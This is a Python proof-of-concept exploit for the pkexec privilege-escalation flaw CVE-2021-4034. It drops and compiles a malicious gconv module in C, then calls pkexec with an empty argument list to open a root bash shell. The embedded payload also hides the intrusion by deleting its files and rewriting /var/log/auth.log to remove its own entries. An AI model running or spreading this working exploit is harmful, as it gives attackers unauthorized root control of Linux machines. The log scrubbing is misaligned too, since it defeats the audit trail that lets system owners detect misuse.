#!/usr/bin/env python3
import os
from ctypes import *
from ctypes.util import find_library

def errcheck(result, func, args):
    if not result:
        print("NORESULT")
    else:
        print(result)
class bcol:
    RED = '\033[95m'
    GREEN = '\033[92m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(f"""{bcol.RED}
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
""")
print("CVE-2021-4034 PoC by Kim Schulz")
# suid shell code. Will cleanup from the build etc to remove tracks
suidCode = """
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void gconv(){}
void gconv_init() {
  setgid(0);setegid(0);
  setuid(0);seteuid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
         "/bin/bash");
  exit(0);
}
"""
# Python cannot set null argv so we need a bit of C for that
executor = """
#include <stdlib.h>
#include <unistd.h>
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
"""
print(f"{bcol.GREEN} [+] Setting up environment...")
os.mkdir('GCONV_PATH=.')
os.system('touch "GCONV_PATH=./pkwner"')
os.chmod('GCONV_PATH=./pkwner', 0o00755)
os.mkdir("pkwner")
print(" [+] Creating offensive gconv config...")
file = open('pkwner/gconv-modules', "w")
file.write('module UTF-8// PKWNER// pkwner 2')
file.close()
print(" [+] Creating offensive gconv module...")
file = open('pkwner/pkwner.c', 'w')
file.write(suidCode)
file.close()
os.system('gcc -shared -fPIC -o pkwner/pkwner.so pkwner/pkwner.c')
useclib = True
try:
    c = CDLL(find_library('c'), use_errno=True)
except OSError:
    print(f"{bcol.RED}[-] Could not find C library - will build executor")
    print(" [+] Creating executor...")
    file = open("pkwner/exec.c", "w")
    file.write(executor)
    file.close()
    os.system('gcc -o pkwner/executor pkwner/exec.c')
    useclib = False

print(f" [+] Pop that shell...{bcol.RED}BAM!{bcol.RESET}")
if useclib:
    env = [
        b'pkwner',
        b'PATH=GCONV_PATH=.',
        b'CHARSET=PKWNER',
        b'SHELL=pkwner',
        None
    ]
    # convert env to char* array
    env_p = (c_char_p * len(env))()
    env_p[:] = env
    c.errcheck = errcheck
    c.execve(b'/usr/bin/pkexec', c_char_p(None), env_p)
    print(f'BÅÅÅÅT {get_errno()}')
else:
    os.system('./pkwner/executor')
# cleanup if failed
if os.path.isdir('pkwner'):
    os.rmdir('pkwner')
    print(f'{bcol.RED}[-] cleanup after failure (pkwner dir')
elif os.path.isdir('GCONV_PATH=.'):
    os.rmdir('GCONV_PATH=.')
    print(f'{bcol.RED}[-] cleanup after failure (GCONV_PATH=. dir')
else:
    print(f"{bcol.GREEN}[=)]{bcol.UNDERLINE}{bcol.BOLD}nice job!{bcol.RESET}")

